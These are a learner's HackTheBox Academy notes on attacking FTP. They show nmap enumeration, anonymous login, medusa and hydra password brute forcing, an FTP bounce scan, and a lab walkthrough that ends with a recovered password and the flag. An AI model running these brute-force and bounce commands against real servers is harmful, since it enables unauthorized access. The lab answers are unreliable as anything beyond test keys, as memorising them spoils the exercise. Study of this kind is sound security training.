---
description: 11/11 HackTheBox notes started.
---

# Attacking Common Services

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### Attacking FTP

FTP is used to transfer files between computers, whilst also performing directory and file operations like changing the current working directory. By default FTP listens on port TCP/21.

#### Enumerating FTP

```shell-session
0xgrooted@htb[/htb]$ sudo nmap -sC -sV -p 21 192.168.2.142 

Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 22:04 EDT
Nmap scan report for 192.168.2.142
Host is up (0.00054s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 1170     924            31 Mar 28  2001 .banner
| d--x--x--x   2 root     root         1024 Jan 14  2002 bin
| d--x--x--x   2 root     root         1024 Aug 10  1999 etc
| drwxr-srwt   2 1170     924          2048 Jul 19 18:48 incoming [NSE: writeable]
| d--x--x--x   2 root     root         1024 Jan 14  2002 lib
| drwxr-sr-x   2 1170     924          1024 Aug  5  2004 pub
|_Only 6 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
```

#### Misconfigurations

We can login anonymously using the username anonymous with no password. This can be done as follows:

```shell-session
0xgrooted@htb[/htb]$ ftp 192.168.2.142    
                     
Connected to 192.168.2.142.
220 (vsFTPd 2.3.4)
Name (192.168.2.142:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0               9 Aug 12 16:51 test.txt
226 Directory send OK.
```

#### Brute forcing with medusa

```shell-session
0xgrooted@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
                                                             
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>                                                      
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456 (1 of 14344392 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 12345 (2 of 14344392 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456789 (3 of 14344392 complete)
ACCOUNT FOUND: [ftp] Host: 10.129.203.7 User: fiona Password: family [SUCCESS]
```

#### FTP Bounce Attack

A network attack that uses FTP servers to deliver outbound traffic to another traffic currently on the network.

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

This can be done through nmap:

```shell-session
0xgrooted@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT
Resolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213).
Attempting connection to ftp://anonymous:password@10.10.110.213:21
Connected:220 (vsFTPd 3.0.3)
Login credentials accepted by FTP server!
Initiating Bounce Scan at 04:55
FTP command misalignment detected ... correcting.
Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports)
Nmap scan report for 172.17.0.2
Host is up.

PORT   STATE  SERVICE
80/tcp open http

<SNIP>
```

What port is the FTP service running on?

Method:&#x20;

```
┌─[eu-academy-2]─[10.10.15.86]─[htb-ac-1926447@htb-fvmb4vzeza]─[~/Desktop]
└──╼ [★]$ nmap -sC -sV 10.129.40.233
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-11 12:30 CST
Nmap scan report for 10.129.40.233
Host is up (0.045s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
53/tcp   open  domain      ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
2121/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 ftp      ftp          1959 Apr 19  2022 passwords.list
|_-rw-rw-r--   1 ftp      ftp            72 Apr 19  2022 users.list
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (InlaneFTP) [10.129.40.233]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2121-TCP:V=7.94SVN%I=7%D=11/11%Time=691380C7%P=x86_64-pc-linux-gnu%
SF:r(GenericLines,8C,"220\x20ProFTPD\x20Server\x20\(InlaneFTP\)\x20\[10\.1
SF:29\.40\.233\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20
SF:creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creat
SF:ive\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-11-11T18:30:34
|_  start_date: N/A
|_nbstat: NetBIOS name: ATTCSVC-LINUX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: -17s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.39 seconds

```

Answer: 2121

Question:  What username is available for the FTP server?

Method:

```
┌─[eu-academy-2]─[10.10.15.86]─[htb-ac-1926447@htb-fvmb4vzeza]─[~/Desktop]
└──╼ [★]$ ftp anonymous@10.129.40.233 -p 2121
Connected to 10.129.40.233.
220 ProFTPD Server (InlaneFTP) [10.129.40.233]
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||21289|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp          1959 Apr 19  2022 passwords.list
-rw-rw-r--   1 ftp      ftp            72 Apr 19  2022 users.list
226 Transfer complete
ftp> get *
local: htb_vpn_logs.log remote: *
229 Entering Extended Passive Mode (|||12563|)
550 *: No such file or directory
ftp> get users.list
local: users.list remote: users.list
229 Entering Extended Passive Mode (|||15028|)
150 Opening BINARY mode data connection for users.list (72 bytes)
    72      963.18 KiB/s 
226 Transfer complete
72 bytes received in 00:00 (1.57 KiB/s)
ftp> get passwords.list
local: passwords.list remote: passwords.list
229 Entering Extended Passive Mode (|||44109|)
150 Opening BINARY mode data connection for passwords.list (1959 bytes)
  1959        3.45 MiB/s 
226 Transfer complete
1959 bytes received in 00:00 (44.70 KiB/s)
ftp> 

```

```
┌─[eu-academy-2]─[10.10.15.86]─[htb-ac-1926447@htb-fvmb4vzeza]─[~/Desktop]
└──╼ [★]$ cat users.list
root
robin
adm
admin
administrator
MARRY
jason
sa
dbuser
pentest
marlin

```

This question and the last both go together

```
┌─[eu-academy-2]─[10.10.15.86]─[htb-ac-1926447@htb-fvmb4vzeza]─[~/Desktop]
└──╼ [★]$ medusa -U users.list -P passwords.list -h 10.129.40.233 -M ftp -n 2121
```

Or with hydra:

```
┌─[eu-academy-2]─[10.10.15.86]─[htb-ac-1926447@htb-fvmb4vzeza]─[~/Desktop]
└──╼ [★]$ hydra -l "robin" -P passwords.list ftp://10.129.40.233:2121 
```

Which gives us the password: 7iz4rnckjsduza7

Now we login:

```
─[eu-academy-2]─[10.10.15.86]─[htb-ac-1926447@htb-fvmb4vzeza]─[~/Desktop]
└──╼ [★]$ ftp robin@10.129.40.233 -p 2121
Connected to 10.129.40.233.
220 ProFTPD Server (InlaneFTP) [10.129.40.233]
331 Password required for robin
Password: 
230 User robin logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||15094|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 robin    robin          27 Apr 18  2022 flag.txt
226 Transfer complete
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||18764|)
150 Opening BINARY mode data connection for flag.txt (27 bytes)
    27        8.65 KiB/s 
226 Transfer complete
27 bytes received in 00:00 (0.58 KiB/s)
ftp> 


```

which gives us the answer:

HTB{ATT4CK1NG\_F7P\_53RV1C3}
